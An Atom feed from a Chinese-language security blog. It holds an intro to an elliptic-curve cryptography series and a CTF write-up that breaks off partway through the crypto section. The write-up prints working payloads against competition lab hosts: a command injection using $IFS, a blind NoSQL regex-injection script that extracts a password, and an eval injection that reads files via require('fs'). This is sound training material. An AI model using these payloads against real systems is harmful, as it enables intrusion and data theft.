<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Moon Jam&#39;s Blog</title>
  
  <subtitle>I&#39;m a panda</subtitle>
  <link href="https://moon-jam.me/atom.xml" rel="self"/>
  
  <link href="https://moon-jam.me/"/>
  <updated>2025-09-15T15:50:34.613Z</updated>
  <id>https://moon-jam.me/</id>
  
  <author>
    <name>Moon Jam</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[ECC 橢圓曲線密碼學：30 天從入門到入土] 前言</title>
    <link href="https://moon-jam.me/IThome_2025ironman_ECC_Day01/"/>
    <id>https://moon-jam.me/IThome_2025ironman_ECC_Day01/</id>
    <published>2025-09-14T16:00:00.000Z</published>
    <updated>2025-09-15T15:50:34.613Z</updated>
    
    <content type="html"><![CDATA[<!-- > 本文同步刊載於 [[ECC 橢圓曲線密碼學：30 天從入門到入土] Day01 - 前言](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) --><p>嗨大家，我是 Panda，平常偶爾會出現在各種 Conference看看世界長點見識，這次鐵人賽是跟成大資安社牛肉湯的朋朋一起組隊，希望可以跟大家一起完賽。</p><p>以我的觀察，在臺灣打 CTF的玩家，最少研究的應該是密碼學吧，也許是覺得學密碼學對實務上沒啥幫助，而事實上Crypto 比起 Web Reverse Pwn Forensics 在 Real World的漏洞確實少得多，我會想做這個主題就還是為了好玩啦，演算法在腦中流動的感覺還是挺不錯的，另外目前AI 還沒辦法很穩定解出 CTF 的 Crypto 題，也能在之後打 CTF時創造點優勢。</p><p>之所以會選擇 ECC 一方面是在 CTF 常見的幾種 Crypto 題目中（AES / RSA /ECC），就只有 ECC我是沒什麼學過的，另一方面就是他的應用蠻廣的，比較常有機會跟別人<del>炫耀</del> 分享說自己知道他們背後原理是什麼，像TLS / SSL、加密貨幣的區塊鏈交易簽章、OpenSSH、WireGuard VPN等等的，然後因為 ECC 金鑰比較小，運算比較快，所以也常用在 IoT上，就想說趁這個機會好好學一下，免得每次都只是會跟別人打打嘴炮但其實背後原理一知半解 XD</p><p>這個系列中，會以一個已經對 現代密碼學有過基礎認識的初學者的角度，記錄學習橢圓曲線密碼學過程，要是文章的安排有點亂還請見諒，如果有寫錯的地方也歡迎大家指正，希望可以幫助到同樣對密碼學演算法有興趣的人們owo/</p><p>最後關於題目，我在今天才發現好像應該叫<code>橢圓曲線密碼學</code>比較好，畢竟後面除了講加密外大部分應該都是說數位簽章，但因為組隊挑戰昨天就截止了，除非我重新報名否則鐵人賽的題目沒辦法改，就算了吧，不過每天的標題就還是會寫改成寫橢圓曲線密碼學比較符合內容。</p><span id="more"></span><h2 id="我的環境">我的環境 <a href="#我的環境" class="headerlink"></a></h2><p>在這個系列中，我應該會主要用 Python 和 C++ 來實作，作業系統可能會是MacOS 15.6 和 Fedora 42 交叉使用，但應該是不會有什麼影響。</p><h2 id="初探-ecc-橢圓曲線密碼學">初探 ECC 橢圓曲線密碼學 <a href="#初探-ecc-橢圓曲線密碼學" class="headerlink"></a></h2><p>因為我英文不太好，又懶得看文字，就直接上 YouTube上看看有沒有些資源可以參考</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_serach_on_YouTube.png" alt="在 Youtube 上查 ECC 橢圓曲線加密的中文結果"><figcaption aria-hidden="true">在 Youtube 上查 ECC橢圓曲線加密的中文結果</figcaption></figure><p>所以我就把兩部影片看完了，挺酷的，給定一條曲線： <span class="math inline">\(y^2 = x^3 + ax + b\)</span></p><p>為曲線上的點，定義一種特別的加法和乘法， <span class="math inline">\(A+B=C\)</span> 如下圖所示，<span class="math inline">\(C\)</span> 為過 <span class="math inline">\(A\)</span> 與 <span class="math inline">\(B\)</span> 直線，和曲線的交點對稱 X 軸後的點</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_Add.png" alt="曲線上點的加法"><figcaption aria-hidden="true">曲線上點的加法</figcaption></figure><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_Add_associative.png" alt="這樣定義的加法具有結合律（沒截到完整的圖，但相信大家應該可以看得懂）"><figcaption aria-hidden="true">這樣定義的加法具有結合律（沒截到完整的圖，但相信大家應該可以看得懂）</figcaption></figure><p>而 <span class="math inline">\(A + A\)</span> 就是 A點切線與曲線的交點對稱 X 軸後的點，並定義這個點為 <span class="math inline">\(2A\)</span> 如下</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_multi.png" alt="曲線上點的乘法"><figcaption aria-hidden="true">曲線上點的乘法</figcaption></figure><p>因為加法有結合律，所以明顯的 <span class="math inline">\(3A = A +2A\)</span>，<span class="math inline">\(2A + 2A = 4A\)</span>，對 <span class="math inline">\(kA\)</span> 的那個點只需要做 <span class="math inline">\(\log_{2} k\)</span>次的運算就能找到，這個小細節對後面講到時間效率時會有幫助。</p><p>而在加密時，他們可以用以下的方式創造出共同密鑰並通訊:</p><ol type="1"><li>對一個給定的曲線（即 <span class="math inline">\(y^2 = x^3 + ax +b\)</span> 的 <span class="math inline">\(a, b\)</span>固定），和給定的點 <span class="math inline">\(G\)</span></li><li>Alice 和 Bob 各自生成私鑰 <span class="math inline">\(a, b\)</span>(<span class="math inline">\(a, b\)</span> 會是很大的數字)</li><li>Alice 和 Bob 互相傳遞 <span class="math inline">\(aG\)</span> 和<span class="math inline">\(bG\)</span> 算出的點是什麼</li><li>這時 Alice 可以算出 <span class="math inline">\(a(bG)\)</span> 而Bob 可以算出 <span class="math inline">\(b(aG)\)</span>而這個結果會是一樣的點，且除他們兩個外沒有其他人能運用 <span class="math inline">\(G, aG, bG\)</span> 算出</li><li>運用這組密鑰做加密通訊</li></ol><h2 id="結語">結語 <a href="#結語" class="headerlink"></a></h2><p>今天就差不多到這裡，在初探了是怎麼使用橢圓曲線做加密後，下一步應該會想詳細看看他背後的數學原理，了解他的安全性，希望不要被數學打敗了，感謝大家owo/</p><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/laXAMPP4vds">公钥加密技术 ECC 椭圆曲线加密算法原理</a></li><li><a href="https://youtu.be/0_XmvNu0J40">椭圆曲线加密与哈希函数是什么？非对称加密是什么？比特币中的数学原理</a></li></ul><!-- > 本文同步刊載於 [[ECC 橢圓曲線密碼學：30 天從入門到入土] Day01 - 前言](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) -->]]></content>
    
    
    <summary type="html">&lt;!-- &gt; 本文同步刊載於 [[ECC 橢圓曲線密碼學：30 天從入門到入土] Day01 - 前言](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) --&gt;
&lt;p&gt;嗨大家，我是 Panda，平常偶爾會出現在各種 Conference
看看世界長點見識，這次鐵人賽是跟成大資安社牛肉湯的朋朋一起組隊，希望可以跟大家一起完賽。&lt;/p&gt;
&lt;p&gt;以我的觀察，在臺灣打 CTF
的玩家，最少研究的應該是密碼學吧，也許是覺得學密碼學對實務上沒啥幫助，而事實上
Crypto 比起 Web Reverse Pwn Forensics 在 Real World
的漏洞確實少得多，我會想做這個主題就還是為了好玩啦，演算法在腦中流動的感覺還是挺不錯的，另外目前
AI 還沒辦法很穩定解出 CTF 的 Crypto 題，也能在之後打 CTF
時創造點優勢。&lt;/p&gt;
&lt;p&gt;之所以會選擇 ECC 一方面是在 CTF 常見的幾種 Crypto 題目中（AES / RSA /
ECC），就只有 ECC
我是沒什麼學過的，另一方面就是他的應用蠻廣的，比較常有機會跟別人
&lt;del&gt;炫耀&lt;/del&gt; 分享說自己知道他們背後原理是什麼，像
TLS / SSL、加密貨幣的區塊鏈交易簽章、OpenSSH、WireGuard VPN
等等的，然後因為 ECC 金鑰比較小，運算比較快，所以也常用在 IoT
上，就想說趁這個機會好好學一下，免得每次都只是會跟別人打打嘴炮但其實背後原理一知半解 XD&lt;/p&gt;
&lt;p&gt;這個系列中，會以一個已經對 現代密碼學
有過基礎認識的初學者的角度，記錄學習橢圓曲線密碼學過程，要是文章的安排有點亂還請見諒，如果有寫錯的地方也歡迎大家指正，希望可以幫助到同樣對密碼學演算法有興趣的人們
owo/&lt;/p&gt;
&lt;p&gt;最後關於題目，我在今天才發現好像應該叫&lt;code&gt;橢圓曲線密碼學&lt;/code&gt;比較好，畢竟後面除了講加密外大部分應該都是說數位簽章，但因為組隊挑戰昨天就截止了，除非我重新報名否則鐵人賽的題目沒辦法改，就算了吧，不過每天的標題就還是會寫改成寫橢圓曲線密碼學比較符合內容。&lt;/p&gt;</summary>
    
    
    
    <category term="IThome 2025 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2025-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2025 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2025-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="密碼學" scheme="https://moon-jam.me/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/"/>
    
    <category term="ECC" scheme="https://moon-jam.me/tags/ECC/"/>
    
  </entry>
  
  <entry>
    <title>2025 SCIST MID CTF Writeup</title>
    <link href="https://moon-jam.me/2025_SCIST_MID_CTF_Writeup/"/>
    <id>https://moon-jam.me/2025_SCIST_MID_CTF_Writeup/</id>
    <published>2025-02-11T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.304Z</updated>
    
    <content type="html"><![CDATA[<h1 id="scist-mid-ctf-writeup">SCIST MID CTF Writeup <a href="#scist-mid-ctf-writeup" class="headerlink"></a></h1><figure><img data-src="https://i.imgur.com/I5lei4J.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>我是 SCIST_31 /</p><span id="more"></span><h2 id="web">Web <a href="#web" class="headerlink"></a></h2><h3 id="dig-waf4">dig-waf4 <a href="#dig-waf4" class="headerlink"></a></h3><p>跟作業幾乎一樣，但多禁了一些東西，不過空格還是可以用<code>$IFS</code> 代替，就成功ㄌ</p><p>payload: <code>more$IFS/*_*</code></p><p>flag:<code>SCIST{command_injection_has_somany_combinations!}</code></p><h3 id="da-vinci-code-online">Da Vinci Code online 🛜 <a href="#da-vinci-code-online" class="headerlink"></a></h3><p>要在三次內猜到一個 0-10000 中的一個數字，通靈了幾次沒成功只好去看code 了</p><p>發現</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getSecretAnswer</span>(<span class="params">command</span>) {</span><br><span class="line">    <span class="keyword">if</span> (command === <span class="string">'SHOW_ME_THE_ANSWER_PLZ'</span>) {</span><br><span class="line">        <span class="keyword">return</span> { <span class="attr">status</span>: <span class="string">'secret'</span>, <span class="attr">answer</span>: <span class="variable language_">this</span>.<span class="property">answer</span> };</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> { <span class="attr">status</span>: <span class="string">'error'</span>, <span class="attr">message</span>: <span class="string">'Invalid command'</span> };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">'guess'</span>) {</span><br><span class="line">    response = room.<span class="property">gameRoom</span>.<span class="title function_">guess</span>(data.<span class="property">number</span>);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">'backdoor'</span>) {</span><br><span class="line">    response = room.<span class="property">gameRoom</span>.<span class="title function_">getSecretAnswer</span>(data.<span class="property">command</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    response = { <span class="attr">status</span>: <span class="string">'error'</span>, <span class="attr">message</span>: <span class="string">'Invalid message type'</span> };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以就只要用 BurpSuit 修改 Websocket 的內容</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"type"</span><span class="punctuation">:</span><span class="string">"backdoor"</span><span class="punctuation">,</span><span class="attr">"number"</span><span class="punctuation">:</span><span class="number">100</span><span class="punctuation">,</span><span class="attr">"command"</span><span class="punctuation">:</span><span class="string">"SHOW_ME_THE_ANSWER_PLZ"</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"status"</span><span class="punctuation">:</span><span class="string">"secret"</span><span class="punctuation">,</span><span class="attr">"answer"</span><span class="punctuation">:</span><span class="number">7586</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>就能成功獲得 Flag 了～</p><p>flag: <code>SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}</code></p><h3 id="nosql-injection-blind2">nosql injection blind2 <a href="#nosql-injection-blind2" class="headerlink"></a></h3><p>跟作業的 nosql injection 一樣，但每個字的 range 變大了 (000 ~)，因為之前 code 就是用二分搜，所以基本上就改一點點就能得到 Flag ㄌ</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設定目標 URL</span></span><br><span class="line">url = <span class="string">"http://lab.scist.org:31601/login"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始 flag</span></span><br><span class="line">extracted_flag = <span class="string">"SCIST"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集</span></span><br><span class="line"><span class="comment"># 添加 Unicode 字符集</span></span><br><span class="line">charset = <span class="built_in">list</span>(<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}"</span>) + [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">168</span>, <span class="number">0xFFFF</span> + <span class="number">1</span>) <span class="keyword">if</span> <span class="built_in">chr</span>(i).isprintable()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將字符集中的每個字元進行正則表達式轉義</span></span><br><span class="line">escaped_charset = <span class="string">""</span>.join(re.escape(char) <span class="keyword">for</span> char <span class="keyword">in</span> charset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 布林查詢函數</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    headers = {<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>}</span><br><span class="line">    data = {</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>: {<span class="string">"$regex"</span>: payload},</span><br><span class="line">    }</span><br><span class="line">    response = requests.post(url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login successful"</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用二分搜尋法來測試某位置的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search_for_char</span>(<span class="params">base_flag, charset</span>):</span><br><span class="line">    low, high = <span class="number">0</span>, <span class="built_in">len</span>(charset) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        char_to_test = charset[mid]</span><br><span class="line">        payload = <span class="string">f"^<span class="subst">{base_flag}</span><span class="subst">{char_to_test}</span>"</span></span><br><span class="line">        <span class="keyword">if</span> test_payload(payload):</span><br><span class="line">            <span class="comment"># 字符符合條件，表示在目前的範圍內</span></span><br><span class="line">            <span class="keyword">return</span> char_to_test</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果字元不在範圍內，調整範圍</span></span><br><span class="line">            <span class="keyword">if</span> (high - low &gt; <span class="number">15000</span>): <span class="comment"># 發現 regex 用 [] 的範圍好像差不多只有 15000 個字元</span></span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                idx = low</span><br><span class="line">                <span class="keyword">while</span> idx &lt; high:</span><br><span class="line">                    idx = <span class="built_in">min</span>(idx + <span class="number">15000</span>, high)</span><br><span class="line">                    flag = flag <span class="keyword">or</span> test_payload(<span class="string">f"^<span class="subst">{base_flag}</span>[<span class="subst">{<span class="string">""</span>.join(charset[low:idx])}</span>]"</span>)</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">f"^<span class="subst">{base_flag}</span>[<span class="subst">{<span class="string">""</span>.join(charset[low:mid])}</span>]"</span></span><br><span class="line">                <span class="keyword">if</span> test_payload(payload):</span><br><span class="line">                    high = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    low = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 開始盲注</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] Extracting flag..."</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> extracted_flag.endswith(<span class="string">"}"</span>):</span><br><span class="line">    char = binary_search_for_char(extracted_flag, escaped_charset)</span><br><span class="line">    <span class="keyword">if</span> char:</span><br><span class="line">        extracted_flag += char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[+] Current flag: <span class="subst">{extracted_flag}</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[!] No matching character found. Check charset or logic."</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"[+] Final flag: <span class="subst">{extracted_flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>SCIST{WOW_y0u_4r3_7h3_ＢＬＩＮＤ}</code></p><h3 id="calculator">calculator <a href="#calculator" class="headerlink"></a></h3><p>看了一下程式碼，發現在 server.js 有一個eval，所以就可以直接注入，並發現 dockerfile 裡面有寫 flag 的名稱，就得到flag ㄌ</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wss.<span class="title function_">on</span>(<span class="string">'connection'</span>, <span class="function">(<span class="params">ws</span>) =&gt;</span> {</span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">'message'</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Received:'</span>, message);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">let</span> result = <span class="built_in">eval</span>(<span class="string">'('</span> + message + <span class="string">')'</span>);</span><br><span class="line">      ws.<span class="title function_">send</span>(result);</span><br><span class="line">    } <span class="keyword">catch</span> (e) {</span><br><span class="line">      ws.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag_3298fh9u32niaergjfwe9ij923.txt /</span></span><br></pre></td></tr></tbody></table></figure><p>payload:<code>(() =&gt; require("fs").readFileSync("/flag_3298fh9u32niaergjfwe9ij923.txt", "utf8"))()</code></p><p>flag: <code>SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}</code></p><h2 id="misc">Misc <a href="#misc" class="headerlink"></a></h2><h3 id="trick-or-treat">Trick or Treat <a href="#trick-or-treat" class="headerlink"></a></h3><p>這題是一個 nim game，可以用 nim sum 來解，就寫個 script 輕鬆得到flag</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_move</span>(<span class="params">state</span>):</span><br><span class="line">    nim_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> candies <span class="keyword">in</span> state:</span><br><span class="line">        nim_sum ^= candies</span><br><span class="line">    <span class="keyword">for</span> i, candies <span class="keyword">in</span> <span class="built_in">enumerate</span>(state):</span><br><span class="line">        target = candies ^ nim_sum</span><br><span class="line">        <span class="keyword">if</span> target &lt; candies:</span><br><span class="line">            remove = candies - target</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>, remove</span><br><span class="line">    <span class="comment"># 沒有必勝移動時，從第一個非空箱子拿 1 顆</span></span><br><span class="line">    <span class="keyword">for</span> i, candies <span class="keyword">in</span> <span class="built_in">enumerate</span>(state):</span><br><span class="line">        <span class="keyword">if</span> candies &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i + <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 連線到遠端伺服器（請根據實際伺服器位址與 port 修改）</span></span><br><span class="line">io = remote(<span class="string">"lab.scist.org"</span>, <span class="number">31418</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"HELLO"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(io.recvuntil(<span class="string">b'boxes, each contains '</span>))</span><br><span class="line">    st = io.recvuntil(<span class="string">b'c'</span>).decode().strip(<span class="string">'c'</span>).split(<span class="string">', '</span>)</span><br><span class="line">    st = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> st]</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">sum</span>(st) &gt; <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Current state:"</span>, st)</span><br><span class="line">        out = compute_move(st)</span><br><span class="line">        io.recvuntil(<span class="string">b"It's your turn, entering (n, k) denotes to take k candy from the box n: "</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(out).encode())</span><br><span class="line">        st[out[<span class="number">0</span>] - <span class="number">1</span>] -= out[<span class="number">1</span>]</span><br><span class="line">        io.recvline()</span><br><span class="line">        <span class="keyword">if</span> io.recvuntil(<span class="string">b' '</span>).decode() == <span class="string">'Mission '</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        io.recvuntil(<span class="string">b'I take '</span>)</span><br><span class="line">        robot_take = <span class="built_in">int</span>(io.recvuntil(<span class="string">b' '</span>).decode())</span><br><span class="line">        io.recvuntil(<span class="string">b'box '</span>)</span><br><span class="line">        robot_box = <span class="built_in">int</span> (io.recvuntil(<span class="string">b'.'</span>).decode()[:-<span class="number">1</span>])</span><br><span class="line">        st[robot_box - <span class="number">1</span>] -= robot_take</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>SCIST{trick-or-treat? trick-xor-treat!}</code></p><h2 id="crypto">Crypto <a href="#crypto" class="headerlink"></a></h2><h3 id="elgamal-oracle---首殺">Elgamal oracle - 首殺 / <a href="#elgamal-oracle---首殺" class="headerlink"></a></h3><p>是個白箱，看看是怎麼加密的</p><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Random.random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, isPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElGamal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbit: <span class="built_in">int</span> = <span class="number">1024</span></span>):</span><br><span class="line">        <span 